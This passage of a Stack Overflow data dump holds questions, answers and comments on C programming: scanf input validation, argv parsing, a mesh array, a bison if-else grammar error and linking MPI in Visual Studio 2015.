"last_edit_date": 1447281951, "creation_date": 1447279939, "answer_id": 33660837, "question_id": 33660753, "link": "https://stackoverflow.com/questions/33660753/scanf-only-sign-and-number/33660837#33660837", "title": "scanf() only sign and number", "body": "<p><code>scanf(\" %c %d\", &amp;sign &amp;number) != 2</code> does not work as the format does not <em>require</em> a space between the <code>char</code> and <code>int</code>.  A <code>\" \"</code> matches 0 or more white-space, not a single <code>' '</code>.</p>\n\n<hr>\n\n<p>So code needs to look for <em>sign</em>, <em>space</em> and <em>number</em>.</p>\n\n<pre><code>char sign[2];\nint number;\nif (scanf(\" %1[+-]%*1[ ]%d\", sign, &amp;number) != 2) {\n  puts(\"Fail\");\n}\n</code></pre>\n\n<p><code>\" \"</code> Scan and skip optional white-space<br>\n<code>\"%1[+-]\"</code>  Scan and save 1 + or -<br>\n<code>\"%*1[ ]\"</code> Scan and do not save a space.<br>\n<code>\"%d\"</code> Scan white-spaces and then an <code>int</code>.</p>\n\n<hr>\n\n<p>Note: Better to use <code>fgets()</code>, read the line and then use <code>sscanf()</code>.</p>\n\n<hr>\n\n<p>[Edit] More robust solution - it uses <code>fgets()</code> as robust solutions do not use <code>scanf()</code>. </p>\n\n<pre><code>  char buf[80];\n  if (fgets(buf, sizeof buf, stdin) == NULL) {\n    puts(\"EOF\");\n  } else {\n    int n = 0;\n    sscanf(buf,\" %*1[+-]%*1[ ]%*[0-9] %n\", &amp;n);\n    if (n == 0) {\n      puts(\"Fail - conversion incomplete\");\n    } else if (buf[n] != '\\0') {\n      puts(\"Fail - Extra garbage\");\n    } else {\n      char sign;\n      int number;\n      sscanf(buf,\" %c%d\", &amp;sign, &amp;number);\n      printf(\"Success %c %d\\n\",sign, number);\n    }\n  }\n</code></pre>\n\n<p><code>\"%n\"</code> Saves the count of characters scanned.  </p>\n\n<p>Tip: Appending <code>%n\"</code> to <code>int n = 0; ... sscanf(..., \"... %n\"</code> to the end of a format is an easy trick to 1) test if scanning was incomplete <code>if (n == 0)</code> and  2) test for trailing non-white-space <code>if (buf[n] != '\\0')</code></p>\n\n<p>Note: No checks for overflow.</p>\n"}], "owner": {"reputation": 51, "user_id": 5552410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f393ce15d9211a51c1cfff85e0fe55d4?s=128&d=identicon&r=PG&f=1", "display_name": "jinx", "link": "https://stackoverflow.com/users/5552410/jinx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 801, "favorite_count": 0, "accepted_answer_id": 33660837, "answer_count": 2, "score": 4, "last_activity_date": 1447287236, "creation_date": 1447279588, "last_edit_date": 1447287236, "question_id": 33660753, "link": "https://stackoverflow.com/questions/33660753/scanf-only-sign-and-number", "title": "scanf() only sign and number", "body": "<p>I want to get variables <em>sign</em> and <em>number</em> with scanf().<br>\nThere is how it should works:</p>\n\n<pre><code> input:\n + 10\n output:\n OK, \"sign = +\" and \"number = 10\"\n</code></pre>\n\n<p>&nbsp;</p>\n\n<pre><code> input:\n +10\n output:\n Fail!\n</code></pre>\n\n<p>&nbsp;</p>\n\n<pre><code> input:\n 10\n output:\n Fail!\n</code></pre>\n\n<p>&nbsp;</p>\n\n<pre><code> input:\n a\n output:\n Fail!\n</code></pre>\n\n<p>I've tried this solution, but it doesn't worked for me. Especially for inputs: <em>+10</em> and <em>a</em></p>\n\n<pre><code> plus='+';\n minus='-';     \n\n if ( scanf(\" %c %d\", &amp;sign, &amp;number) != 2 || ((sign != minus) &amp;&amp; (sign != plus)) || number &lt; 0 ) \n                {\n                printf(\"Fail!\");\n                } \n            else {...}\n</code></pre>\n\n<p>Thanks.</p>\n"}, {"tags": ["c", "linux", "parameter-passing"], "comments": [{"owner": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "edited": false, "score": 0, "creation_date": 1447278486, "post_id": 33660441, "comment_id": 55094498, "body": "why would it be any different? it will be passed through <code>argv</code> as well. (and <b>not</b> through <code>argc</code>, that&#39;s just the length of the <code>argv</code> array.)"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 3, "creation_date": 1447278487, "post_id": 33660441, "comment_id": 55094499, "body": "<code>argv[1]</code> would seem logical. No? This is something you can learn from any beginners C book or tutorial and suggest you go through something like that to learn the basics in a systematic way."}, {"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 0, "creation_date": 1447278604, "post_id": 33660441, "comment_id": 55094562, "body": "You mention <code>argv[2]</code> and <code>argv[3]</code>. What would go in <code>argv[0]</code> and <code>argv[1]</code>?"}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447278606, "post_id": 33660441, "comment_id": 55094564, "body": "yes, it&#39;s just text. Starting with &quot;-&quot; or &quot;--&quot; or anything else is just program&#39;s convention."}, {"owner": {"reputation": 109970, "user_id": 372643, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/63edcce213b4c96b8b4a660e1df2da08?s=128&d=identicon&r=PG", "display_name": "Bruno", "link": "https://stackoverflow.com/users/372643/bruno"}, "edited": false, "score": 0, "creation_date": 1447278625, "post_id": 33660441, "comment_id": 55094581, "body": "You should look into <code>getopt</code>."}, {"owner": {"reputation": 372, "user_id": 5407350, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/73bc08427436d2df7ee47eab86ddb800?s=128&d=identicon&r=PG&f=1", "display_name": "Daeto", "link": "https://stackoverflow.com/users/5407350/daeto"}, "edited": false, "score": 0, "creation_date": 1447280999, "post_id": 33660441, "comment_id": 55095722, "body": "I was just confused about the -- in front of the word so I thought it might be something special."}, {"owner": {"reputation": 372, "user_id": 5407350, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/73bc08427436d2df7ee47eab86ddb800?s=128&d=identicon&r=PG&f=1", "display_name": "Daeto", "link": "https://stackoverflow.com/users/5407350/daeto"}, "edited": false, "score": 0, "creation_date": 1447281196, "post_id": 33660441, "comment_id": 55095826, "body": "Also I wonder, why is everyone giving my question a thumbs down? Was it really that stupid? I did try to research that but could not find anything and was confused by the first argument and needed a quick answer. So sorry if it came across as not useful, unclear or not showing any research effort."}], "answers": [{"tags": [], "owner": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "is_accepted": true, "score": 3, "last_activity_date": 1447316073, "last_edit_date": 1447316073, "creation_date": 1447278650, "answer_id": 33660499, "question_id": 33660441, "link": "https://stackoverflow.com/questions/33660441/what-exactly-do-these-arguments-mean-in-linux/33660499#33660499", "title": "What exactly do these arguments mean in linux?", "body": "<p>The C runtime does not discriminate any arguments, whether they start with <code>--</code> or not. So you have,</p>\n\n<pre><code>argv[0] = \"./program\"\nargv[1] = \"--something\"\nargv[2] = \"X\"\nargv[3] = \"Y\"\nargv[4] = NULL\n</code></pre>\n\n<p>It is your program that assigns meaning to those values.</p>\n"}, {"comments": [{"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "edited": false, "score": 0, "creation_date": 1447278725, "post_id": 33660505, "comment_id": 55094635, "body": "It&#39;s also possible (and even common) that <code>--something</code> takes no parameter."}], "tags": [], "owner": {"reputation": 249903, "user_id": 2422776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2353050223ebecb113741c29458de4b2?s=128&d=identicon&r=PG", "display_name": "Mureinik", "link": "https://stackoverflow.com/users/2422776/mureinik"}, "is_accepted": false, "score": 0, "last_activity_date": 1447278672, "creation_date": 1447278672, "answer_id": 33660505, "question_id": 33660441, "link": "https://stackoverflow.com/questions/33660441/what-exactly-do-these-arguments-mean-in-linux/33660505#33660505", "title": "What exactly do these arguments mean in linux?", "body": "<p>Anything following the command itself will get to <code>argv</code>:</p>\n\n<p><code>argv[1]</code> is <code>--something</code>, <code>argv[2]</code> is <code>X</code> and <code>argv[3]</code> is <code>Y</code>. Following the *unix conventions, this would mean your program has a parameter called \"something\" with a value of \"X\", and \"Y\" is the argument the program should be applied on - but that's completely up to your implementation of the program.</p>\n"}, {"comments": [{"owner": {"reputation": 372, "user_id": 5407350, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/73bc08427436d2df7ee47eab86ddb800?s=128&d=identicon&r=PG&f=1", "display_name": "Daeto", "link": "https://stackoverflow.com/users/5407350/daeto"}, "edited": false, "score": 0, "creation_date": 1447280874, "post_id": 33660609, "comment_id": 55095656, "body": "Thanks a lot as well! : )"}], "tags": [], "owner": {"reputation": 109970, "user_id": 372643, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/63edcce213b4c96b8b4a660e1df2da08?s=128&d=identicon&r=PG", "display_name": "Bruno", "link": "https://stackoverflow.com/users/372643/bruno"}, "is_accepted": false, "score": 0, "last_activity_date": 1447279037, "creation_date": 1447279037, "answer_id": 33660609, "question_id": 33660441, "link": "https://stackoverflow.com/questions/33660441/what-exactly-do-these-arguments-mean-in-linux/33660609#33660609", "title": "What exactly do these arguments mean in linux?", "body": "<p>These arguments are no different from others as far as <code>argc</code> and <code>argv</code> are concerned.</p>\n\n<p>What makes them different is that many Linux tools (but not only) use <a href=\"https://en.wikipedia.org/wiki/Getopt\" rel=\"nofollow\"><code>getopt</code></a> to make it easier to make sense of those options. This is particularly useful when you need more than a couple of possible options (or can't remember what they're for).</p>\n\n<p>You can generally have long and short options, with and without arguments.</p>\n\n<p>The convention is also to have <code>--help</code> print out a summary of all the available options.</p>\n\n<p>For example, with the help for <code>man</code>:</p>\n\n<pre><code>$ man --help\nUsage: man [OPTION...] [SECTION] PAGE...\n\n  -C, --config-file=FILE     use this user configuration file\n  -d, --debug                emit debugging messages\n  -D, --default              reset all options to their default values\n      --warnings[=WARNINGS]  enable warnings from groff\n</code></pre>\n\n<p>In this particular example, you can use either <code>-d</code> or <code>--debug</code> to turn on debugging. <code>getopt</code> (or similar) is used to parse <code>-d</code> or <code>--debug</code> into something meaningful. <code>-C</code> or <code>--config-file</code> would also be equivalent, but expect an argument.</p>\n\n<p>There are similar equivalents in other languages (for example <a href=\"https://docs.python.org/2.7/library/argparse.html\" rel=\"nofollow\">Python's argparse</a>, or Apache Commons CLI in Java).</p>\n"}], "owner": {"reputation": 372, "user_id": 5407350, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/73bc08427436d2df7ee47eab86ddb800?s=128&d=identicon&r=PG&f=1", "display_name": "Daeto", "link": "https://stackoverflow.com/users/5407350/daeto"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "accepted_answer_id": 33660499, "answer_count": 3, "score": -3, "last_activity_date": 1447316073, "creation_date": 1447278375, "last_edit_date": 1447278505, "question_id": 33660441, "link": "https://stackoverflow.com/questions/33660441/what-exactly-do-these-arguments-mean-in-linux", "title": "What exactly do these arguments mean in linux?", "body": "<p>I have a program written in C and the command I am supposed to run it with on linux looks like this:</p>\n\n<pre><code>./program --something X Y\n</code></pre>\n\n<p>What exactly does that mean? I think X Y will be the arguments so <code>argc[2]</code> will be <code>X</code> and <code>argc[3]</code> will be <code>Y</code>?</p>\n\n<p>But what about <code>--something</code>?</p>\n\n<p>Thanks a lot! </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1447278394, "post_id": 33660383, "comment_id": 55094455, "body": "I don&#39;t see any relation between the image, the code and the question. Please, get out of your context and try to describe it from outside."}, {"owner": {"reputation": 401, "user_id": 2028385, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lzXzP.png?s=128&g=1", "display_name": "JoulinRouge", "link": "https://stackoverflow.com/users/2028385/joulinrouge"}, "edited": false, "score": 0, "creation_date": 1447278500, "post_id": 33660383, "comment_id": 55094504, "body": "this code will initialize the matrix net with the same value link... what are you tryng to do?"}, {"owner": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 2, "creation_date": 1447278715, "post_id": 33660383, "comment_id": 55094630, "body": "You probably want to connect nodes where <code>i</code> is the same or where <code>j</code> is the same. Like (0,0) to (0,1) to (0,2), but not (0,0) to (2, 1)."}, {"owner": {"reputation": 12418, "user_id": 214296, "user_type": "registered", "accept_rate": 99, "profile_image": "https://www.gravatar.com/avatar/268966bdb84008bef79268f0a45b533e?s=128&d=identicon&r=PG", "display_name": "Jim Fell", "link": "https://stackoverflow.com/users/214296/jim-fell"}, "edited": false, "score": 0, "creation_date": 1447279389, "post_id": 33660383, "comment_id": 55094944, "body": "What you are describing in a two-dimensional array.  If you want a mesh, then you need to implement a linked list."}, {"owner": {"reputation": 1113, "user_id": 4092381, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh4.googleusercontent.com/-iUd348W6B_A/AAAAAAAAAAI/AAAAAAAAAjs/0d8MLWyOoFo/photo.jpg?sz=128", "display_name": "Jordan Melo", "link": "https://stackoverflow.com/users/4092381/jordan-melo"}, "edited": false, "score": 0, "creation_date": 1447281405, "post_id": 33660383, "comment_id": 55095935, "body": "What is <code>net</code>? What is <code>link</code>? Why is <code>net</code> a 5x5 array?"}], "answers": [{"comments": [{"owner": {"reputation": 367, "user_id": 2999915, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/ebe6d9e2fd56b3218d4deff684fe6fab?s=128&d=identicon&r=PG&f=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/2999915/mike"}, "edited": false, "score": 0, "creation_date": 1447287016, "post_id": 33661043, "comment_id": 55097983, "body": "Thank you. Well explained"}], "tags": [], "owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "is_accepted": true, "score": 0, "last_activity_date": 1447280816, "creation_date": 1447280816, "answer_id": 33661043, "question_id": 33660383, "link": "https://stackoverflow.com/questions/33660383/mesh-network-using-c/33661043#33661043", "title": "Mesh Network using C", "body": "<p>Since you are talking about a 5x5 matrix and complained about the diagonals filled in, I assume that you want a matrix where the entries are either nodes (where you have \"X\"), links (where you have either \"---\" or \"|\"), or where you have nothing. I'm not sure if using a 5x5 array for a 3x3 mesh is a good idea, but if you really want that you could do something like the following:</p>\n\n<p>First create an enumerated type with 3 elements like thus:</p>\n\n<pre><code>typedef enum {NODE,LINK,EMPTY} slot;\n</code></pre>\n\n<p>Then declare <code>net</code> as a 5x5 array of type <code>slot</code> and populate it in 2 nested loops depending on whether nodes and links or links and empties are alternating. The following code illustrates how it works:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\ntypedef enum {NODE,LINK,EMPTY} slot;\n\nint main(void){\n    int i,j;\n    slot net[5][5];\n\n    for(i = 0; i &lt; 5; i+=2){\n       for(j = 0; j &lt; 5; j++){\n            net[i][j] = j%2 == 0? NODE : LINK;\n       }\n    }\n\n\n    for(i = 1; i &lt; 5; i+=2){\n       for(j = 0; j &lt; 5; j++){\n           net[i][j] = j%2 == 0? LINK : EMPTY;\n       }\n    }\n\n    printf(\"\\n\");\n    for(i = 0; i &lt; 5; i++){\n       for(j = 0; j &lt; 5; j++){\n           switch(net[i][j]){\n              case NODE:\n                  printf(\"X\");\n                  break;\n              case LINK:\n                  printf(\"+\");\n                  break;\n              default:\n                  printf(\" \");\n                  break;\n           }\n       }\n       printf(\"\\n\");\n    }\n    return 0;\n}\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>X+X+X\n+ + +\nX+X+X\n+ + +\nX+X+X\n</code></pre>\n"}], "owner": {"reputation": 367, "user_id": 2999915, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/ebe6d9e2fd56b3218d4deff684fe6fab?s=128&d=identicon&r=PG&f=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/2999915/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 980, "favorite_count": 0, "closed_date": 1531829152, "accepted_answer_id": 33661043, "answer_count": 1, "score": -3, "last_activity_date": 1447280816, "creation_date": 1447278122, "question_id": 33660383, "link": "https://stackoverflow.com/questions/33660383/mesh-network-using-c", "closed_reason": "Needs details or clarity", "title": "Mesh Network using C", "body": "<p>I'm trying to create a mesh network of size 3*3 in C language for simulation purpose (using <code>CSIM</code>). </p>\n\n<pre><code>X --- X --- X\n|     |     |\nX --- X --- X\n|     |     |\nX --- X --- X\n</code></pre>\n\n<p>The following overlapping loop is supposed to simulate the link between nodes however does not really simulate the mesh topology since it counts the diagonal links as well. I apologize for this question but I really don't know how to modify it to represent a mesh network. Any hint is appreciated.</p>\n\n<pre><code>int net[5][5];\n    for(i=0; i&lt;5;i++)\n    {\n        for(j=0; j&lt;5;j++)\n        {\n            net[i][j] = link;\n        }\n    }\n</code></pre>\n"}, {"tags": ["c", "bison", "yacc", "flex-lexer"], "comments": [{"owner": {"reputation": 325120, "user_id": 501557, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/e4bac7ebd5f5a06c716f508af656e24b?s=128&d=identicon&r=PG", "display_name": "templatetypedef", "link": "https://stackoverflow.com/users/501557/templatetypedef"}, "edited": false, "score": 0, "creation_date": 1447278698, "post_id": 33660363, "comment_id": 55094620, "body": "While it&#39;s great that you&#39;ve given us a reduced piece of the code, we can&#39;t independently test this out. If you post a minimal, self-contained example that lets us reproduce the issue, we can try things out on our own systems."}, {"owner": {"user_type": "does_not_exist", "display_name": "user3672051"}, "reply_to_user": {"reputation": 325120, "user_id": 501557, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/e4bac7ebd5f5a06c716f508af656e24b?s=128&d=identicon&r=PG", "display_name": "templatetypedef", "link": "https://stackoverflow.com/users/501557/templatetypedef"}, "edited": false, "score": 0, "creation_date": 1447279544, "post_id": 33660363, "comment_id": 55095013, "body": "@templatetypedef I can attempt to do this, though before I do, can any of the code associated with each grammar rule effect this? I have some type checking and other stuff going on fore these rules, which would make it basically impossible to give complete code. If I only need the grammar part then it is more reasonable."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447280524, "post_id": 33660363, "comment_id": 55095491, "body": "What&#39;s a shift_else?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user3672051"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447280735, "post_id": 33660363, "comment_id": 55095583, "body": "@immibis Im not sure what you mean, its a placeholder for the empty string I guess, used to resolve the trailing else shift/reduce conflict"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447281273, "post_id": 33660363, "comment_id": 55095866, "body": "@JDOdle Well, after <code>if(1 &gt; 5) ;</code> your parser is expecting either an ELSE, or a shift_else. There clearly isn&#39;t an ELSE there. Is there a shift_else there?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user3672051"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447281500, "post_id": 33660363, "comment_id": 55095980, "body": "@immibis by defining <code>shift_else</code> as <code>nonassoc</code> it is assumed to be the empty string right? I thought this was a typical way of resolving the trailing else problem"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447281914, "post_id": 33660363, "comment_id": 55096176, "body": "@JDOdle You defined ELSE as nonassoc; is it assumed to be the empty string?"}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 1, "creation_date": 1447283191, "post_id": 33660363, "comment_id": 55096693, "body": "The rules <code>Stmt: If_Stmt shift_else ; | If_Stmt ELSE Stmt ; | &#39;;&#39; | ... ;</code> are not legal. It is impossible to help you if you don&#39;t post a legal, usable extract of your grammar."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user3672051"}, "edited": false, "score": 0, "creation_date": 1447282379, "post_id": 33661317, "comment_id": 55096388, "body": "<code>ELSE</code> is also defined as a <code>token</code> thus it would not be the empty string, at least this was my logic. So if <code>shift_else</code> is not assumed to be the empty string then what is it? and is there a way to define something as the empty string to resolve the trailing else conflict?"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1447282794, "post_id": 33661317, "comment_id": 55096542, "body": "@JDOdle: I think you&#39;re looking for the <code>%prec</code> declaration. Read the <a href=\"https://www.gnu.org/software/bison/manual/bison.html#Contextual-Precedence\" rel=\"nofollow noreferrer\">bison manual</a>"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447284299, "post_id": 33661317, "comment_id": 55097136, "body": "@JDOdle <code>shift_else: ;</code>?"}], "tags": [], "owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "is_accepted": true, "score": 0, "last_activity_date": 1447282080, "creation_date": 1447282080, "answer_id": 33661317, "question_id": 33660363, "link": "https://stackoverflow.com/questions/33660363/nonassoc-causing-syntax-error/33661317#33661317", "title": "%nonassoc causing syntax error", "body": "<p>After reading <code>if(1 &gt; 5) ;</code> the parser is expecting an <code>ELSE</code> or a <code>shift_else</code>.</p>\n\n<p>Presumably there's not an <code>ELSE</code> there, since it doesn't appear in the source code.</p>\n\n<p>Unless your lexer conjures a <code>shift_else</code> out of thin air, the next token will be a <code>}</code>, which is not an <code>ELSE</code> or <code>shift_else</code>, hence the error.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user3672051"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 301, "favorite_count": 0, "accepted_answer_id": 33661317, "answer_count": 1, "score": 1, "last_activity_date": 1447282080, "creation_date": 1447278071, "question_id": 33660363, "link": "https://stackoverflow.com/questions/33660363/nonassoc-causing-syntax-error", "title": "%nonassoc causing syntax error", "body": "<p>for an if and if-else statement grammar I have some grammar.</p>\n\n<p>The following is a simplified excerpt from my code to show how I have the if and if-else statement grammar, so if there are errors unrelated to that grammar then don't worry about it. I assure you there are no compilation errors in the code I am using:</p>\n\n<pre><code>%token IF ELSE VOID ID VOID_PARAMS\n\n%nonassoc shift_else\n%nonassoc ElSE\n\n%%\n\nFunc: VOID ID VOID_PARAMS '{' Stmt '}'\n;\nIf_Stmt: IF '(' L_expr ')' Stmt\n;\nStmt: If_Stmt shift_else\n;\n| If_Stmt ELSE Stmt\n;\n| ';'\n| ...\n;\n\nL_expr: ...\n;\n</code></pre>\n\n<p>It has been working just fine for a while, but now it is finding errors when it reaches the end of a function. For example:</p>\n\n<pre><code>void foo(void) {\n    if (1 &gt; 5)\n        ;\n}\n</code></pre>\n\n<p>gives this output ( using yyerror() ):</p>\n\n<pre><code>Found unexpected token: '}' on line 4\n</code></pre>\n\n<p>Any suggestions as to why this could be happening? And what can I do to fix this?</p>\n"}, {"tags": ["c++", "c", "visual-studio", "visual-studio-2015", "mpi"], "comments": [{"owner": {"reputation": 2640, "user_id": 5195699, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f85291bb71f55981b1d412f1efcb7603?s=128&d=identicon&r=PG&f=1", "display_name": "R_Kapp", "link": "https://stackoverflow.com/users/5195699/r-kapp"}, "edited": false, "score": 3, "creation_date": 1447277343, "post_id": 33660147, "comment_id": 55093940, "body": "OpenMP support isn&#39;t necessary for MPI. From your error list (specifically, the first warning), it looks like you provided the path to the 64-bit MPI library, while you are compiling for a 32-bit architecture. Either provide it the 32-bit library, or compile for a 64-bit architecture."}, {"owner": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 0, "creation_date": 1447277918, "post_id": 33660147, "comment_id": 55094213, "body": "&#39;I wrote mpi.lib and in C/C++/Language&#39;.  What programming language is called &#39;Language&#39;?"}, {"owner": {"reputation": 1398, "user_id": 5175197, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0958c29d6df22ae886fc18962e42d532?s=128&d=identicon&r=PG", "display_name": "kostyabakay", "link": "https://stackoverflow.com/users/5175197/kostyabakay"}, "reply_to_user": {"reputation": 2640, "user_id": 5195699, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f85291bb71f55981b1d412f1efcb7603?s=128&d=identicon&r=PG&f=1", "display_name": "R_Kapp", "link": "https://stackoverflow.com/users/5195699/r-kapp"}, "edited": false, "score": 0, "creation_date": 1447278182, "post_id": 33660147, "comment_id": 55094357, "body": "@R_Kapp thanks, it helped me. Write this in answer and I will choose this for a solution."}, {"owner": {"reputation": 1398, "user_id": 5175197, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0958c29d6df22ae886fc18962e42d532?s=128&d=identicon&r=PG", "display_name": "kostyabakay", "link": "https://stackoverflow.com/users/5175197/kostyabakay"}, "reply_to_user": {"reputation": 2157, "user_id": 3865653, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Fv3Fj.jpg?s=128&g=1", "display_name": "Deanie", "link": "https://stackoverflow.com/users/3865653/deanie"}, "edited": false, "score": 0, "creation_date": 1447278233, "post_id": 33660147, "comment_id": 55094388, "body": "@Deanie it is the name of directory in properties."}], "answers": [{"tags": [], "owner": {"reputation": 2640, "user_id": 5195699, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f85291bb71f55981b1d412f1efcb7603?s=128&d=identicon&r=PG&f=1", "display_name": "R_Kapp", "link": "https://stackoverflow.com/users/5195699/r-kapp"}, "is_accepted": true, "score": 3, "last_activity_date": 1447278266, "creation_date": 1447278266, "answer_id": 33660414, "question_id": 33660147, "link": "https://stackoverflow.com/questions/33660147/why-mpi-doesnt-work-in-visual-studio-2015/33660414#33660414", "title": "Why MPI doesn&#39;t work in Visual Studio 2015?", "body": "<p>Your first (and only) warning states that you are linking a 64-bit library with a 32-bit build. You need to either provide a 32-bit library or build for a 64-bit architecture to get rid of the linker errors.</p>\n"}], "owner": {"reputation": 1398, "user_id": 5175197, "user_type": "registered", "accept_rate": 100, "profile_image": 